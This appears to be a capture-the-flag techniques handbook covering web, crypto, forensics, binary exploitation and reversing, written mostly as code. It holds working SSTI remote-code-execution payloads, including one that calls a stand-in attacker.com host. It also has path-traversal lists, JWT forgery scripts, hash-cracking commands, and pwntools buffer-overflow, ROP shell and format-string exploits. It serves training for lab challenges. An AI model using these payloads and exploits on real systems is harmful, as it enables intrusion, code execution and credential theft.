# CTF Techniques Deep Dive

## 1. CTF Overview & Strategy

### 1.1 CTF Categories

```
Web:        SQL injection, XSS, SSRF, path traversal, PHP tricks, deserialization
Crypto:     Classical ciphers, RSA attacks, XOR, padding oracle, hash cracking
Forensics:  File carving, steganography, PCAP analysis, log analysis, memory forensics
Pwn:        Buffer overflow, format strings, ROP chains, heap exploitation
Reversing:  Disassembly, decompilation, anti-analysis bypass, keygen
Misc:       OSINT, encoding/decoding, recon, scripting
OSINT:      Social media, domain recon, geolocation

Scoring:
- Static: each challenge worth fixed points
- Dynamic: harder challenges (lower solve count) = more points
- First blood: bonus for solving first

Strategy:
1. Survey ALL challenges at start (estimate time per category)
2. Start with easy/medium (maximize points per hour)
3. Don't get stuck > 30min without progress → switch
4. Read challenge description carefully (hints often hidden in title/description)
5. Team: divide by specialization
```

### 1.2 Essential CTF Tools

```bash
# Install CTF toolkit
sudo apt-get install -y \
    binwalk steghide stegsolve foremost \
    pwndbg gdb-pwndbg \
    nmap netcat socat \
    python3-pwntools \
    john hashcat \
    wireshark tshark \
    exiftool imagemagick \
    volatility3 \
    radare2 ltrace strace

pip install pwntools requests flask \
    pycryptodome gmpy2 sympy \
    z3-solver \
    Pillow pytesseract

# Ghidra (decompiler)
# Download: https://ghidra-sre.org/
# Run: ./ghidraRun

# IDA Pro Free
# Download: https://hex-rays.com/ida-free/

# pwndbg (GDB enhancement for pwn)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# ROPgadget
pip install ROPgadget

# CyberChef (browser-based)
# https://gchq.github.io/CyberChef/

# DCode.fr (classical cipher decoder)
# https://www.dcode.fr/
```

---

## 2. Web CTF Techniques

### 2.1 Common Web CTF Patterns

```python
# Recon first
import requests
import re
from urllib.parse import urljoin

def web_recon(base_url):
    # Check robots.txt
    r = requests.get(urljoin(base_url, '/robots.txt'))
    print("robots.txt:", r.text[:500])
    
    # Check source code for comments
    r = requests.get(base_url)
    comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
    for c in comments:
        print("HTML Comment:", c.strip()[:200])
    
    # Check response headers
    print("Headers:", dict(r.headers))
    
    # Common CTF paths
    paths = [
        '/.git/HEAD', '/.git/config',
        '/flag', '/flag.txt', '/secret', '/admin',
        '/backup', '/source.php', '/.env',
        '/phpinfo.php', '/info.php',
        '/.DS_Store', '/sitemap.xml',
    ]
    for path in paths:
        r = requests.get(urljoin(base_url, path))
        if r.status_code == 200:
            print(f"FOUND: {path} ({len(r.text)} bytes)")
            print(r.text[:200])

# PHP type juggling
# "0e" == "0e" is True (both parsed as float 0)
# "0e123456789" == "0e987654321" → both = 0 → True!
# Common magic hashes (MD5):
MAGIC_HASHES_MD5 = {
    '240610708': '0e462097431906509019562988736854',  # md5('240610708') starts with 0e
    'QNKCDZO': '0e830400451993494058024219903391',
    'aabg74k': '0e209367895872642938781366251994',
}

# JSON/PHP type confusion
# {"username": {"$gt": ""}}  → NoSQL injection
# username[]=admin → PHP array comparison bypass

# Path traversal variants
payloads = [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',    # double-dot bypass
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',  # URL encoded
    '%252e%252e%252f',  # double URL encoded
    '..%c0%af',         # UTF-8 overlong
    '..%ef%bc%8f',      # Unicode fullwidth solidus
    '/proc/self/environ',  # Alternative read
    '/proc/self/cmdline',
    '/var/www/html/flag',
]
```

### 2.2 SSTI Exploitation

```python
# Server-Side Template Injection (SSTI)
# Detection: {{7*7}} → 49 in page = SSTI!

# Jinja2 (Python/Flask)
payloads_jinja2 = [
    # RCE
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    
    # Alternative class traversal
    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}",
    # Note: index 396 varies - need to find subprocess.Popen
    
    # Find subprocess.Popen
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    # Search for: <class 'subprocess.Popen'>
    
    # Read file
    "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
    # Find: <class '_io.FileIO'>
    
    # Bypass underscore filter
    "{{''.join(['_','_','class','_','_'])|attr('__mro__')}}",
    
    # Bypass dot filter
    "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__(\"os\").popen(\"id\").read()')}}",
]

# Twig (PHP/Symfony)
payloads_twig = [
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{_self.env.setCache('ftp://attacker.com')}}{{_self.env.loadTemplate('x')}}",
]

# Freemarker (Java)
payloads_freemarker = [
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
]

# Velocity (Java)
payloads_velocity = [
    '#set($x="")##\n#set($rt=$x.class.forName("java.lang.Runtime"))##\n#set($chr=$x.class.forName("java.lang.Character"))##\n#set($str=$x.class.forName("java.lang.String"))##\n#set($ex=$rt.getRuntime().exec("id"))##',
]
```

### 2.3 JWT CTF Tricks

```python
import jwt
import json
import base64

# Trick 1: Algorithm None (unsigned token)
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "superuser"}

header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged_token = f"{header_b64}.{payload_b64}."  # Empty signature

# Trick 2: HS256/RS256 confusion (if server uses RS256 and leaks public key)
# Sign with public key as HMAC secret
import hmac, hashlib

public_key = "-----BEGIN PUBLIC KEY-----\n..."
payload = json.dumps({"admin": True})
header = json.dumps({"alg": "HS256", "typ": "JWT"})

to_sign = (
    base64.urlsafe_b64encode(header.encode()).rstrip(b'=').decode() + "." +
    base64.urlsafe_b64encode(payload.encode()).rstrip(b'=').decode()
)
sig = hmac.new(public_key.encode(), to_sign.encode(), hashlib.sha256).digest()
token = to_sign + "." + base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

# Trick 3: Crack weak JWT secret
# jwt-cracker / hashcat -a 0 -m 16500 token.txt wordlist.txt
# Or: python3 -m jwt.main <token> <secret>

# Trick 4: kid injection
# kid = "../../dev/null" (empty secret = empty HMAC = predictable)
# kid = "' UNION SELECT 'attacker_secret' -- -" (SQLi in kid lookup)
header_sqli = {"alg": "HS256", "kid": "' UNION SELECT 'pwned' -- -", "typ": "JWT"}
# Sign with 'pwned' as secret

# Trick 5: Decode without verification (CTF recon)
token = "eyJ..."
# Split by .
parts = token.split('.')
header_decoded = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
payload_decoded = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
print("Header:", header_decoded)
print("Payload:", payload_decoded)
```

---

## 3. Crypto CTF Techniques

### 3.1 Classical Ciphers

```python
# Caesar / ROT
def rot_all(text):
    for n in range(26):
        result = ''.join(
            chr((ord(c) - ord('A' if c.isupper() else 'a') + n) % 26 + 
                ord('A' if c.isupper() else 'a')) if c.isalpha() else c
            for c in text
        )
        print(f"ROT{n:2}: {result}")

# Vigenere brute force (if key length known)
def vigenere_decrypt(ciphertext, key):
    key = key.upper()
    result = []
    key_idx = 0
    for c in ciphertext:
        if c.isalpha():
            shift = ord(key[key_idx % len(key)]) - ord('A')
            base = ord('A') if c.isupper() else ord('a')
            result.append(chr((ord(c) - base - shift) % 26 + base))
            key_idx += 1
        else:
            result.append(c)
    return ''.join(result)

# IC (Index of Coincidence) to find key length
def index_of_coincidence(text):
    text = ''.join(c.upper() for c in text if c.isalpha())
    n = len(text)
    freq = {}
    for c in text:
        freq[c] = freq.get(c, 0) + 1
    ic = sum(f * (f-1) for f in freq.values()) / (n * (n-1))
    return ic

# English IC ≈ 0.065, Random ≈ 0.038
# Try key lengths 1-20, split ciphertext into groups, 
# group with highest avg IC = likely key length

# Bacon cipher
BACON = {'A': 'AAAAA', 'B': 'AAAAB', 'C': 'AAABA', 'D': 'AAABB',
         'E': 'AABAA', 'F': 'AABAB', 'G': 'AABBA', 'H': 'AABBB',
         'I': 'ABAAA', 'J': 'ABAAB', 'K': 'ABABA', 'L': 'ABABB',
         'M': 'ABBAA', 'N': 'ABBAB', 'O': 'ABBBA', 'P': 'ABBBB',
         'Q': 'BAAAA', 'R': 'BAAAB', 'S': 'BAABA', 'T': 'BAABB',
         'U': 'BABAA', 'V': 'BABAB', 'W': 'BABBA', 'X': 'BABBB',
         'Y': 'BAAAA', 'Z': 'BAAAB'}

BACON_DECODE = {v: k for k, v in BACON.items()}

# Rail fence cipher
def rail_fence_decode(ciphertext, rails):
    n = len(ciphertext)
    pattern = []
    for i in range(n):
        rail = i % (2 * (rails - 1))
        if rail >= rails:
            rail = 2 * (rails - 1) - rail
        pattern.append(rail)
    
    rows = [''] * rails
    idx = 0
    for r in range(rails):
        for i, rail in enumerate(pattern):
            if rail == r:
                rows[r] += ciphertext[idx]
                idx += 1
    
    result = [''] * n
    row_iters = [iter(row) for row in rows]
    for i, rail in enumerate(pattern):
        result[i] = next(row_iters[rail])
    return ''.join(result)
```

### 3.2 RSA CTF Attacks

```python
from sympy import factorint, gcd
import gmpy2

# Attack 1: Small n - factor directly
def small_n_attack(n, e, c):
    factors = factorint(n)
    if len(factors) == 2:
        primes = list(factors.keys())
        p, q = primes[0], primes[1]
        phi = (p-1) * (q-1)
        d = pow(e, -1, phi)
        m = pow(c, d, n)
        return m.to_bytes((m.bit_length() + 7) // 8, 'big')

# Attack 2: Common factor between two keys (GCD)
def common_factor_attack(n1, n2, e, c1, c2):
    p = gcd(n1, n2)
    if p > 1:
        # Found common factor
        q1 = n1 // p
        q2 = n2 // p
        
        phi1 = (p-1) * (q1-1)
        d1 = pow(e, -1, phi1)
        m1 = pow(c1, d1, n1)
        
        phi2 = (p-1) * (q2-1)
        d2 = pow(e, -1, phi2)
        m2 = pow(c2, d2, n2)
        
        return m1, m2

# Attack 3: Wiener's attack (d is small)
def wiener_attack(e, n):
    from fractions import Fraction
    
    def continued_fraction(num, den):
        fracs = []
        while den:
            fracs.append(num // den)
            num, den = den, num % den
        return fracs
    
    def convergents(cf):
        n_list, d_list = [], []
        for i, a in enumerate(cf):
            if i == 0:
                n_list.append(a)
                d_list.append(1)
            elif i == 1:
                n_list.append(a * n_list[-1] + 1)
                d_list.append(a)
            else:
                n_list.append(a * n_list[-1] + n_list[-2])
                d_list.append(a * d_list[-1] + d_list[-2])
        return zip(n_list, d_list)
    
    cf = continued_fraction(e, n)
    for k, d in convergents(cf):
        if k == 0:
            continue
        phi, rem = divmod(e * d - 1, k)
        if rem != 0:
            continue
        # Check if phi gives integer p, q
        # n = p*q and (p-1)(q-1) = phi
        # p+q = n - phi + 1
        b = n - phi + 1
        discriminant = b*b - 4*n
        if discriminant > 0:
            sqrt_disc = gmpy2.isqrt(discriminant)
            if sqrt_disc * sqrt_disc == discriminant:
                p = (b + int(sqrt_disc)) // 2
                q = (b - int(sqrt_disc)) // 2
                if p * q == n:
                    return d

# Attack 4: Håstad's Broadcast Attack (same message, different keys, small e)
def hastad_attack(ciphertexts_and_moduli, e=3):
    # CRT: find x such that x ≡ c_i (mod n_i)
    from sympy.ntheory.modular import crt
    
    ns = [nm[1] for nm in ciphertexts_and_moduli]
    cs = [nm[0] for nm in ciphertexts_and_moduli]
    
    N = 1
    for n in ns:
        N *= n
    
    x = 0
    for c, n in zip(cs, ns):
        Ni = N // n
        xi = pow(Ni, -1, n)
        x = (x + c * Ni * xi) % N
    
    # m^e = x, take e-th root
    m, exact = gmpy2.iroot(x, e)
    if exact:
        return m.to_bytes((int(m).bit_length() + 7) // 8, 'big')

# Attack 5: Padding Oracle / Bleichenbacher (if PKCS#1 v1.5)
# Attack 6: Small e, small m (e.g., m^e < n → e-th root directly)
def small_message_attack(c, e, n):
    # If m^e < n, then c = m^e exactly (no modular reduction)
    m, exact = gmpy2.iroot(c, e)
    if exact:
        return m.to_bytes((int(m).bit_length() + 7) // 8, 'big')

# factordb lookup (CTF n values often in database)
import requests
def factordb_lookup(n):
    r = requests.get(f"http://factordb.com/api?query={n}")
    data = r.json()
    if data['status'] in ['FF', 'P']:
        factors = []
        for f, exp in data['factors']:
            factors.extend([int(f)] * exp)
        return factors
```

### 3.3 Hash Cracking & Analysis

```bash
# Identify hash type
hashid 5d41402abc4b2a76b9719d911017c592   # MD5

# hash-identifier
echo "5d41402abc4b2a76b9719d911017c592" | hash-identifier

# Crack with hashcat
# MD5
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA256
hashcat -a 0 -m 1400 hash.txt rockyou.txt

# bcrypt
hashcat -a 0 -m 3200 hash.txt rockyou.txt

# NTLM (Windows)
hashcat -a 0 -m 1000 ntlm_hash.txt rockyou.txt

# Rules (mangling)
hashcat -a 0 -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (pattern known)
hashcat -a 3 -m 0 hash.txt "pass?d?d?d?d"  # pass + 4 digits

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-md5 --wordlist=rockyou.txt hash.txt

# Online lookups
# https://crackstation.net/
# https://md5decrypt.net/
# https://hashes.com/en/decrypt/hash

# Hash length extension attack with hashpumpy
pip install hashpumpy
python3 -c "
import hashpumpy
# If: sign = sha256(secret + data)
# Attacker knows: sign, len(secret), data
# Can forge: sha256(secret + data + padding + extra_data)
new_sig, new_msg = hashpumpy.hashpump(
    '4bc453b53cb3d914b45f4b250294236adba2c0e09ff6f03793949e7e39fd4cc1',  # known hash
    'original_data',    # known data
    '&admin=true',      # data to append
    16                  # length of secret key
)
print(f'New hash: {new_sig}')
print(f'New message: {new_msg.hex()}')
"
```

---

## 4. Forensics CTF Techniques

### 4.1 File Format Analysis

```bash
# Identify file type (ignore extension)
file suspicious_file
file -i suspicious_file  # MIME type

# Magic bytes (file signatures)
xxd suspicious_file | head -4
hexdump -C suspicious_file | head

# Common magic bytes:
# PNG: 89 50 4E 47 0D 0A 1A 0A
# JPEG: FF D8 FF
# PDF: 25 50 44 46 (% P D F)
# ZIP: 50 4B 03 04
# GIF: 47 49 46 38 (GIF8)
# ELF: 7F 45 4C 46
# PE: 4D 5A (MZ)

# Extract embedded files
binwalk -e suspicious_file        # auto-extract
binwalk -e --run-as=root file     # some signatures need root
foremost -i suspicious_file -o output/

# Find strings
strings suspicious_file | grep -i "flag\|ctf\|key\|pass"
strings -n 4 suspicious_file | grep "CTF{"

# Exif data (hidden in images)
exiftool suspicious.jpg
exiftool -all= clean.jpg  # strip exif

# Check for appended data
# Image with appended zip/text:
hexdump -C image.png | grep -A2 "49 45 4E 44"  # PNG IEND marker
# Data after IEND = hidden content

# Unzip embedded in image
binwalk -e image.png
# Or: zip can be appended to any file
unzip image.png  # try it!
```

### 4.2 Steganography

```bash
# LSB Steganography (Least Significant Bit)
# Install stegsolve (Java)
java -jar stegsolve.jar

# Zsteg - detect LSB steganography in PNG/BMP
gem install zsteg
zsteg suspicious.png
zsteg -a suspicious.png  # all methods

# Steghide - LSB in JPEG/BMP with password
steghide extract -sf suspicious.jpg -p "password"
steghide info suspicious.jpg  # check if data is embedded

# stegcracker - brute force steghide password
pip install stegcracker
stegcracker suspicious.jpg /usr/share/wordlists/rockyou.txt

# PNG chunk analysis
pngcheck -v suspicious.png  # check PNG chunks
python3 - << 'EOF'
import struct

with open('suspicious.png', 'rb') as f:
    data = f.read()

# Parse PNG chunks
offset = 8  # Skip PNG signature
while offset < len(data):
    if offset + 8 > len(data):
        break
    length = struct.unpack('>I', data[offset:offset+4])[0]
    chunk_type = data[offset+4:offset+8].decode('ascii', errors='replace')
    chunk_data = data[offset+8:offset+8+length]
    crc = data[offset+8+length:offset+12+length]
    
    print(f"Chunk: {chunk_type}, Length: {length}")
    if chunk_type not in ['IHDR', 'IDAT', 'IEND', 'sRGB', 'gAMA', 'cHRM', 'pHYs']:
        print(f"  UNUSUAL CHUNK! Data: {chunk_data[:50]}")
    
    offset += 12 + length
EOF

# Audio steganography
# Audacity: look at spectrogram (View → Show Clipping or Analyze → Spectrogram)
sox suspicious.wav -n spectrogram -o spectrogram.png
# Flag sometimes visible in spectrogram

# OpenStego: visual watermarking
java -jar OpenStego.jar extract -sf image.png -p password -op output/

# Invisible ink / whitespace
# cat file.txt | xxd | grep "20 20"  # double spaces
# stegsnow: hides data in whitespace of text
```

### 4.3 PCAP Analysis

```bash
# Wireshark / tshark CTF techniques

# Follow TCP stream to see full conversation
tshark -r capture.pcap -q -z "follow,tcp,ascii,0"

# Extract all HTTP objects (files transferred)
tshark -r capture.pcap --export-objects http,output/

# Extract FTP files
tshark -r capture.pcap -Y "ftp-data" -w ftp_data.pcap

# Find credentials in HTTP basic auth
tshark -r capture.pcap -Y "http.authorization" -T fields \
    -e http.authorization | base64 -d

# Find DNS queries (potential exfiltration)
tshark -r capture.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name | sort | uniq

# Decode base64 in DNS (DNS tunneling)
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | \
    grep "\.tunnel\." | \
    awk -F. '{print $1}' | \
    python3 -c "
import sys, base64
for line in sys.stdin:
    try:
        decoded = base64.b64decode(line.strip() + '==')
        if decoded.isprintable() or b'CTF' in decoded:
            print(decoded)
    except:
        pass
"

# USB keyboard capture (keyboard HID)
# Each packet contains a keycode
python3 - << 'EOF'
import struct
from scapy.all import *

KEY_CODES = {
    0x04: 'a', 0x05: 'b', 0x06: 'c', 0x07: 'd', 0x08: 'e',
    0x09: 'f', 0x0A: 'g', 0x0B: 'h', 0x0C: 'i', 0x0D: 'j',
    0x0E: 'k', 0x0F: 'l', 0x10: 'm', 0x11: 'n', 0x12: 'o',
    0x13: 'p', 0x14: 'q', 0x15: 'r', 0x16: 's', 0x17: 't',
    0x18: 'u', 0x19: 'v', 0x1A: 'w', 0x1B: 'x', 0x1C: 'y',
    0x1D: 'z', 0x1E: '1', 0x1F: '2', 0x20: '3', 0x21: '4',
    0x22: '5', 0x23: '6', 0x24: '7', 0x25: '8', 0x26: '9',
    0x27: '0', 0x28: '\n', 0x2C: ' ', 0x2D: '-', 0x2E: '=',
    0x2F: '[', 0x30: ']', 0x31: '\\', 0x33: ';', 0x34: "'",
    0x36: ',', 0x37: '.', 0x38: '/',
}

pkts = rdpcap('usb_keyboard.pcap')
result = []
for pkt in pkts:
    if hasattr(pkt, 'HID') or len(pkt) >= 8:
        try:
            data = bytes(pkt)[-8:]
            modifier = data[0]
            keycode = data[2]
            if keycode in KEY_CODES:
                char = KEY_CODES[keycode]
                if modifier in (0x02, 0x20):  # SHIFT
                    char = char.upper()
                result.append(char)
        except:
            pass

print('Captured text:', ''.join(result))
EOF
```

---

## 5. PWN (Binary Exploitation)

### 5.1 Buffer Overflow Basics

```python
from pwn import *

# Setup
elf = ELF('./vulnerable_binary')
context.binary = elf
context.log_level = 'debug'

# Local exploit
p = process('./vulnerable_binary')

# Remote exploit
# p = remote('ctf.example.com', 1337)

# Find offset to return address
# Method 1: cyclic pattern (pwntools)
pattern = cyclic(200)
p.sendline(pattern)
p.wait()
# Check core dump or crash in GDB:
# (gdb) info registers rsp
# (gdb) x/s $rsp
# p.sendline(cyclic(200))  then in gdb: cyclic_find(value_at_crash)
offset = cyclic_find(0x61616172)  # value of rsp at crash

# Method 2: known offset from GHIDRA analysis
offset = 72  # local_buf[64] + 8 bytes of saved RBP

print(f"Offset to return address: {offset}")

# Simple return-to-win (ret2win)
win_addr = elf.symbols['win']  # or: elf.sym['win']

payload = b'A' * offset
payload += p64(win_addr)  # overwrite return address

p.sendline(payload)
p.interactive()
```

### 5.2 ROP Chain (Return-Oriented Programming)

```python
from pwn import *

elf = ELF('./rop_challenge')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Find gadgets
# ROPgadget --binary ./challenge | grep "pop rdi"
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # stack alignment for 64-bit

# ret2plt: call system("/bin/sh")
# Step 1: Leak libc address via puts(puts@got)
payload = flat({
    offset: [
        pop_rdi,
        elf.got['puts'],   # argument to puts
        elf.plt['puts'],   # call puts(puts@got) → leaks puts addr
        elf.sym['main'],   # return to main to exploit again
    ]
})

p = process('./rop_challenge')
p.sendline(payload)
p.recvuntil(b'\n')  # receive output before leak

puts_leak = u64(p.recv(6).ljust(8, b'\x00'))
print(f"puts @ {hex(puts_leak)}")

# Calculate libc base
libc.address = puts_leak - libc.sym['puts']
print(f"libc @ {hex(libc.address)}")

# Step 2: Call system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

payload2 = flat({
    offset: [
        ret,              # alignment (if needed)
        pop_rdi,
        bin_sh,           # "/bin/sh"
        system,           # system("/bin/sh")
    ]
})

p.sendline(payload2)
p.interactive()
```

### 5.3 Format String Exploit

```python
from pwn import *

p = process('./format_string_vuln')

# Exploit: printf(user_input) without format specifier
# %p - print pointer (stack leak)
# %n - write number of bytes printed so far (write primitive!)
# %x - hex value
# %s - read string from stack address

# Step 1: Leak stack values (find useful address)
p.sendline('%p.' * 30)
leaks = p.recvline().decode().split('.')
print("Stack leaks:")
for i, leak in enumerate(leaks):
    print(f"  Position {i+1}: {leak}")

# Step 2: Find position of our input on stack
# Send AAAA%n$p where n is the position number
for n in range(1, 30):
    p.sendline(f"AAAA%{n}$p".encode())
    out = p.recvline()
    if b'0x41414141' in out:
        print(f"Our input is at position {n}")
        break

# Step 3: Write arbitrary value to arbitrary address
# Using %n format specifier
target_addr = 0x0804a030  # address to write to
target_value = 0x42       # value to write (1 byte)

# pwntools fmtstr helper
writes = {target_addr: target_value}
payload = fmtstr_payload(offset=6, writes=writes)  # offset = position on stack
p.sendline(payload)
```

---

## 6. Reverse Engineering

### 6.1 Ghidra Tips for CTF

```bash
# Ghidra analysis workflow:
# 1. File → Import File → auto-analyze
# 2. Look for main() or WinMain in Symbol Tree
# 3. Open Decompiler window (side by side with Disassembly)
# 4. Rename variables: click var → L (label) or right-click → Rename
# 5. Change variable type: right-click → Retype Variable

# Key functions to check:
# - main: entry point
# - strcmp, strncmp: string comparisons (flag checking)
# - validate, check_flag, verify: custom flag validators

# String search in Ghidra:
# Search → Search For Strings → filter by encoding/min length

# Cross-references:
# Click on string "Correct!" → right-click → References → Find References
# Navigate to where string is used → find comparison logic

# Common CTF patterns in decompiled code:
# Pattern 1: Direct comparison
# if (strcmp(input, "flag_value") == 0) { puts("Correct!"); }

# Pattern 2: XOR encoded string
# char encoded[] = {0x41, 0x42, 0x43, ...};
# for (i=0; i<len; i++) encoded[i] ^= 0x42;
# if (strcmp(input, encoded) == 0) { ... }

# Pattern 3: Character-by-character check
# for (i=0; i<len; i++) {
#     if (input[i] != (expected[i] ^ key[i % key_len])) { return false; }
# }
```

### 6.2 Python Reversing Script

```python
# Reverse engineer binary checks

# Technique: Z3 constraint solver
from z3 import *

# Example: binary checks each character satisfies complex constraints
flag_chars = [BitVec(f'c{i}', 8) for i in range(16)]
s = Solver()

# Constraints extracted from disassembly:
s.add(flag_chars[0] == ord('C'))
s.add(flag_chars[1] == ord('T'))
s.add(flag_chars[2] == ord('F'))
s.add(flag_chars[3] == ord('{'))

# Complex constraints (from binary logic)
s.add(flag_chars[4] + flag_chars[5] == 0x9A)
s.add(flag_chars[4] ^ flag_chars[6] == 0x1A)
s.add(flag_chars[5] * flag_chars[7] == 0x1C50)
# ... more constraints

s.add(flag_chars[15] == ord('}'))

# All chars must be printable ASCII
for c in flag_chars:
    s.add(c >= 0x20, c <= 0x7E)

if s.check() == sat:
    model = s.model()
    flag = ''.join(chr(model[c].as_long()) for c in flag_chars)
    print(f"Flag: {flag}")
else:
    print("No solution found")

# Technique: Angr (symbolic execution)
import angr

proj = angr.Project('./challenge', auto_load_libs=False)

# Find path that reaches "Correct!" and avoids "Wrong!"
def find_success(state):
    return b"Correct" in state.posix.dumps(1)

def find_avoid(state):
    return b"Wrong" in state.posix.dumps(1)

simgr = proj.factory.simulation_manager()
simgr.use_technique(angr.exploration_techniques.DFS())
simgr.explore(find=find_success, avoid=find_avoid)

if simgr.found:
    solution = simgr.found[0]
    print("Input:", solution.posix.dumps(0))
```

---

## 7. CTF Tools Quick Reference

### 7.1 Encoding/Decoding

```bash
# Common encodings to try immediately

# Base64
echo "aGVsbG8=" | base64 -d
echo "hello" | base64

# Hex
echo "68656c6c6f" | xxd -r -p
echo "hello" | xxd | head

# URL encoding
python3 -c "from urllib.parse import unquote; print(unquote('%68%65%6C%6C%6F'))"

# ROT13
echo "uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Binary to text
python3 -c "print(int('01101000 01100101 01101100 01101100 01101111'.replace(' ',''), 2).to_bytes(5,'big').decode())"

# Morse code
# Use: dcode.fr/morse-code or CyberChef

# Atbash (reverse alphabet: A=Z, B=Y, ...)
echo "svool" | tr 'A-Za-z' 'Z-Az-a'

# Multiple encodings in CyberChef:
# "Magic" operation auto-detects encoding!
```

### 7.2 CTF Checklist

```
WEB:
□ View source code (Ctrl+U)
□ Check robots.txt, sitemap.xml
□ Check HTTP response headers
□ Check cookies (decode base64/JWT)
□ Try admin/admin, admin/password credentials
□ Test all input fields for SQLi (' or "1"="1")
□ Check JS files for hardcoded values
□ Try LFI: /etc/passwd, ../../../../etc/passwd
□ Check HTML comments

CRYPTO:
□ Identify cipher type (dcode.fr)
□ Try common CTF ciphers: Caesar, Vigenere, XOR, Base64
□ Factor n if RSA (factordb.com)
□ Check hash length (MD5=32, SHA1=40, SHA256=64)
□ Crack hash (crackstation.net, hashcat)
□ Check for weak e in RSA (small e attack)

FORENSICS:
□ Run file on everything
□ Run strings and grep for "CTF{"
□ Check exif: exiftool
□ Run binwalk -e
□ Check for hidden text (white on white, invisible chars)
□ Try steghide with no password, then common passwords
□ Check spectrogram for audio files (Audacity)
□ Check PNG chunks: pngcheck

PWN:
□ Check security: checksec ./binary
□ Find offset: pattern create → crash → pattern offset
□ Find win function: nm ./binary | grep win
□ Check libc version: strings ./binary | grep GLIBC

MISC:
□ Google the challenge title + "CTF"
□ Check metadata of all files
□ Try CyberChef "Magic" operation
□ Check whitespace (double spaces, zero-width chars)
□ EXIF GPS coordinates → Google Maps
```

| Tool | Use Case | Command |
|------|---------|---------|
| CyberChef | Encoding/decoding | Web UI |
| binwalk | File extraction | `binwalk -e file` |
| strings | Find text | `strings file \| grep flag` |
| file | Identify type | `file unknown` |
| exiftool | Metadata | `exiftool image.jpg` |
| zsteg | PNG LSB steg | `zsteg -a image.png` |
| steghide | LSB with password | `steghide extract -sf image.jpg` |
| hashcat | Hash cracking | `hashcat -a 0 -m 0 hash.txt rockyou.txt` |
| john | Hash cracking | `john --wordlist=rockyou.txt hash.txt` |
| pwntools | Binary exploitation | `from pwn import *` |
| angr | Symbolic execution | `proj = angr.Project('./binary')` |
| z3 | Constraint solving | `s = Solver(); s.add(...)` |
| Ghidra | Decompilation | GUI |
| volatility3 | Memory forensics | `vol.py -f mem.raw windows.pslist` |
| tshark | PCAP analysis | `tshark -r cap.pcap -Y "http"` |
| ROPgadget | Find ROP gadgets | `ROPgadget --binary binary` |
